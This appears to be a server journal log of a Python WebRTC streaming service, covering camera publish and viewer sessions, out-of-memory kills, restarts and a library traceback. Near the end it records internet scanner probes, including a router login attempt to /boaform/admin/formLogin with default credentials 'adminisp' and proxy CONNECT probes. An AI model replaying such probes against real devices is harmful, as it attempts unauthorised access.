+Oct 20 13:27:33 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3340 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:48 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3410 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:49 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3410 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:27:51 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3410 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:29:43 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3495 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:29:50 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3506 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:29:56 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3516 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:30:04 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3524 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:30:05 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:3524 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:09 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:11 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:12 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:12 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:13 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:14 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:15 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:15 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:16 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57810 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:57 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57837 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:36:57 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57837 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+Oct 20 13:37:32 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:57853 - "GET /health HTTP/1.1" 200 OK
+Oct 20 13:50:58 ip-172-31-41-158 python3[67798]: INFO:     45.142.193.27:45056 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 14:05:37 ip-172-31-41-158 python3[67798]: INFO:     204.76.203.219:58512 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 15:14:18 ip-172-31-41-158 python3[67798]: /publish: Access to cam01
+Oct 20 15:14:18 ip-172-31-41-158 python3[67798]: Receive Publisher Track: cam01, kind=video
+Oct 20 15:14:18 ip-172-31-41-158 python3[67798]: INFO:     121.141.19.79:60022 - "POST /publish HTTP/1.1" 200 OK
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: A process of this unit has been killed by the OOM killer.
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=killed, status=9/KILL
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'oom-kill'.
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 27.896s CPU time.
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 15:14:59 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 27.896s CPU time.
+Oct 20 15:15:00 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 15:15:03 ip-172-31-41-158 python3[67979]: INFO:     Started server process [67979]
+Oct 20 15:15:03 ip-172-31-41-158 python3[67979]: INFO:     Waiting for application startup.
+Oct 20 15:15:03 ip-172-31-41-158 python3[67979]: INFO:     Application startup complete.
+Oct 20 15:15:03 ip-172-31-41-158 python3[67979]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 20 15:15:26 ip-172-31-41-158 python3[67979]: /publish: Access to cam01
+Oct 20 15:15:26 ip-172-31-41-158 python3[67979]: Receive Publisher Track: cam01, kind=video
+Oct 20 15:15:26 ip-172-31-41-158 python3[67979]: INFO:     121.141.19.79:60040 - "POST /publish HTTP/1.1" 200 OK
+Oct 20 15:16:27 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=killed, status=9/KILL
+Oct 20 15:16:27 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'signal'.
+Oct 20 15:16:27 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 16.133s CPU time.
+Oct 20 15:16:28 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 2.
+Oct 20 15:16:28 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 15:16:28 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 16.133s CPU time.
+Oct 20 15:16:28 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 15:16:30 ip-172-31-41-158 python3[67985]: INFO:     Started server process [67985]
+Oct 20 15:16:30 ip-172-31-41-158 python3[67985]: INFO:     Waiting for application startup.
+Oct 20 15:16:30 ip-172-31-41-158 python3[67985]: INFO:     Application startup complete.
+Oct 20 15:16:30 ip-172-31-41-158 python3[67985]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 20 15:29:49 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:9858 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 20 15:29:49 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:9859 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 15:30:21 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:9897 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 15:42:31 ip-172-31-41-158 python3[67985]: WARNING:  Invalid HTTP request received.
+Oct 20 16:09:53 ip-172-31-41-158 python3[67985]: INFO:     204.76.203.219:53654 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 16:15:52 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:11947 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 20 16:15:52 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:11948 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:16:52 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:12000 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:17:15 ip-172-31-41-158 python3[67985]: INFO:     66.102.6.234:57670 - "GET /viewer HTTP/1.1" 405 Method Not Allowed
+Oct 20 16:17:19 ip-172-31-41-158 python3[67985]: INFO:     66.102.7.195:64543 - "GET /viewer HTTP/1.1" 405 Method Not Allowed
+Oct 20 16:18:05 ip-172-31-41-158 python3[67985]: INFO:     121.141.19.79:12077 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:19:51 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 20 16:19:51 ip-172-31-41-158 python3[67985]: INFO:     Shutting down
+Oct 20 16:19:51 ip-172-31-41-158 python3[67985]: INFO:     Waiting for application shutdown.
+Oct 20 16:19:51 ip-172-31-41-158 python3[67985]: INFO:     Application shutdown complete.
+Oct 20 16:19:51 ip-172-31-41-158 python3[67985]: INFO:     Finished server process [67985]
+Oct 20 16:19:51 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 20 16:19:51 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 16:19:51 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 9.537s CPU time.
+Oct 20 16:19:51 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 16:19:52 ip-172-31-41-158 python3[68186]: INFO:     Started server process [68186]
+Oct 20 16:19:52 ip-172-31-41-158 python3[68186]: INFO:     Waiting for application startup.
+Oct 20 16:19:52 ip-172-31-41-158 python3[68186]: INFO:     Application startup complete.
+Oct 20 16:19:52 ip-172-31-41-158 python3[68186]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 20 16:20:06 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12186 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:21:15 ip-172-31-41-158 python3[68186]: /publish: Access to cam01
+Oct 20 16:21:15 ip-172-31-41-158 python3[68186]: Receive Publisher Track: cam01, kind=video
+Oct 20 16:21:15 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:60159 - "POST /publish HTTP/1.1" 200 OK
+Oct 20 16:21:28 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connecting
+Oct 20 16:21:28 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connected
+Oct 20 16:21:28 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:21:28 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12271 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:21:56 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:21:56 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:21:56 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:21:56 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:21:56 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12289 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:22:06 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:22:06 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:22:06 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:22:06 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:22:06 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12301 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:22:28 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:22:28 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:22:28 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:22:28 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:22:28 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12318 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:23:02 ip-172-31-41-158 python3[68186]: WARNING:  Invalid HTTP request received.
+Oct 20 16:23:02 ip-172-31-41-158 python3[68186]: WARNING:  Invalid HTTP request received.
+Oct 20 16:23:03 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:23:03 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:23:03 ip-172-31-41-158 python3[68186]: INFO:     149.50.222.8:1329 - "CONNECT www.google.com%3A443 HTTP/1.1" 404 Not Found
+Oct 20 16:23:03 ip-172-31-41-158 python3[68186]: WARNING:  Invalid HTTP request received.
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: End Publisher Video: cam01
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: publisher[cam01] state: closed
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: Closing viewer connection for cam01...
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: /publish: Access to cam01
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: Receive Publisher Track: cam01, kind=video
+Oct 20 16:24:02 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:60182 - "POST /publish HTTP/1.1" 200 OK
+Oct 20 16:24:06 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connecting
+Oct 20 16:24:06 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connected
+Oct 20 16:24:06 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:06 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:09 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:09 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:09 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:09 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:09 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:11 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:11 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:11 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:11 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:11 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:16 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:16 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:16 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:16 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:16 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:19 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:19 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:19 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:19 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:19 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:26 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:26 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:26 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:26 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:26 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12441 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:45 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:45 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:45 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:45 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:45 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12458 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:24:49 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:24:49 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:24:49 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:24:49 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:24:49 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12458 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:25:01 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:25:01 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:25:01 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:25:01 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:25:01 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12492 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:25:20 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:25:20 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:25:20 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:25:20 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:25:20 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12526 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:25:52 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:25:52 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:25:52 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:25:52 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:25:52 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12550 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12670 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:27:52 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12671 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:08 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:30:08 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:30:08 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:30:08 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:30:08 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12791 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:12 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:30:12 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:30:12 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:30:12 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:30:12 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12791 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:19 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:30:19 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:30:19 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:30:19 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:30:19 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12816 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:30 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:30:30 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:30:30 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:30:30 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:30:30 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12823 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:50 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:30:50 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:30:50 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:30:50 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:30:50 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12843 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: Exception in callback Transaction.__retry()
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: handle: <TimerHandle when=2258592.177711238 Transaction.__retry()>
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: Traceback (most recent call last):
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/usr/lib/python3.10/asyncio/selector_events.py", line 1062, in sendto
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self._sock.sendto(data, addr)
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: AttributeError: 'NoneType' object has no attribute 'sendto'
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: During handling of the above exception, another exception occurred:
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: Traceback (most recent call last):
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self._context.run(self._callback, *self._args)
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/aioice/stun.py", line 333, in __retry
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self.__protocol.send_stun(self.__request, self.__addr)
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/aioice/ice.py", line 327, in send_stun
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self.transport.sendto(bytes(message), addr)
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/usr/lib/python3.10/asyncio/selector_events.py", line 1072, in sendto
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self._fatal_error(
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:   File "/usr/lib/python3.10/asyncio/selector_events.py", line 719, in _fatal_error
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]:     self._loop.call_exception_handler({
+Oct 20 16:30:58 ip-172-31-41-158 python3[68186]: AttributeError: 'NoneType' object has no attribute 'call_exception_handler'
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62078 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:31:33 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62078 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:32:05 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:32:05 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:32:05 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:32:05 ip-172-31-41-158 python3[68186]: /viewer: target=cam01
+Oct 20 16:32:05 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12911 - "POST /viewer HTTP/1.1" 200 OK
+Oct 20 16:32:10 ip-172-31-41-158 python3[68186]: viewer state: connecting
+Oct 20 16:32:10 ip-172-31-41-158 python3[68186]: viewer state: connected
+Oct 20 16:32:10 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62234 - "POST /viewer HTTP/1.1" 409 Conflict
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: publisher[cam01] state: closed
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: Closing viewer connection for cam01...
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: End Publisher Video: cam01
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: viewer state: closed
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: /publish: Access to cam01
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: Receive Publisher Track: cam01, kind=video
+Oct 20 16:32:26 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:60224 - "POST /publish HTTP/1.1" 200 OK
+Oct 20 16:32:29 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connecting
+Oct 20 16:32:29 ip-172-31-41-158 python3[68186]: publisher[cam01] state: connected
+Oct 20 16:32:29 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62311 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:32:36 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62346 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:32:40 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:62364 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:32:43 ip-172-31-41-158 python3[68186]: INFO:     121.141.19.79:12938 - "POST /viewer HTTP/1.1" 503 Service Unavailable
+Oct 20 16:33:06 ip-172-31-41-158 python3[68186]: Task was destroyed but it is pending!
+Oct 20 16:33:06 ip-172-31-41-158 python3[68186]: task: <Task pending name='Task-16591' coro=<Connection.check_start() running at /home/ubuntu/.local/lib/python3.10/site-packages/aioice/ice.py:889> wait_for=<Future pending cb=[Task.task_wakeup()]>>
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: A process of this unit has been killed by the OOM killer.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=killed, status=9/KILL
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'oom-kill'.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 2min 38.596s CPU time.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 2min 38.596s CPU time.
+Oct 20 16:38:21 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 20 16:38:24 ip-172-31-41-158 python3[68299]: INFO:     Started server process [68299]
+Oct 20 16:38:24 ip-172-31-41-158 python3[68299]: INFO:     Waiting for application startup.
+Oct 20 16:38:24 ip-172-31-41-158 python3[68299]: INFO:     Application startup complete.
+Oct 20 16:38:24 ip-172-31-41-158 python3[68299]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 20 17:21:48 ip-172-31-41-158 python3[68299]: INFO:     176.57.122.250:41498 - "GET / HTTP/1.0" 404 Not Found
+Oct 20 17:33:10 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:49148 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 18:05:09 ip-172-31-41-158 python3[68299]: INFO:     176.65.149.30:38082 - "GET /login HTTP/1.1" 404 Not Found
+Oct 20 18:16:59 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:50306 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 19:51:51 ip-172-31-41-158 python3[68299]: INFO:     152.53.209.147:58062 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+Oct 20 20:07:11 ip-172-31-41-158 python3[68299]: INFO:     165.154.228.190:43696 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 20:16:26 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:38684 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 20:49:48 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:55432 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 22:09:01 ip-172-31-41-158 python3[68299]: INFO:     45.156.129.46:39701 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 22:09:23 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:51004 - "GET / HTTP/1.1" 404 Not Found
+Oct 20 23:58:28 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:51270 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 00:00:43 ip-172-31-41-158 python3[68299]: INFO:     176.65.149.157:1110 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 00:03:36 ip-172-31-41-158 python3[68299]: INFO:     121.202.196.213:40700 - "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 Not Found
+Oct 21 00:07:36 ip-172-31-41-158 python3[68299]: INFO:     206.168.34.209:33838 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 00:07:47 ip-172-31-41-158 python3[68299]: INFO:     206.168.34.209:44460 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 00:07:47 ip-172-31-41-158 python3[68299]: INFO:     206.168.34.209:44466 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 00:07:47 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 00:07:52 ip-172-31-41-158 python3[68299]: INFO:     206.168.34.209:48630 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 00:07:52 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 00:07:54 ip-172-31-41-158 python3[68299]: INFO:     206.168.34.209:48636 - "GET /robots.txt HTTP/1.1" 404 Not Found
+Oct 21 00:18:05 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:36556 - "GET / HTTP/1.1" 404 Not Found
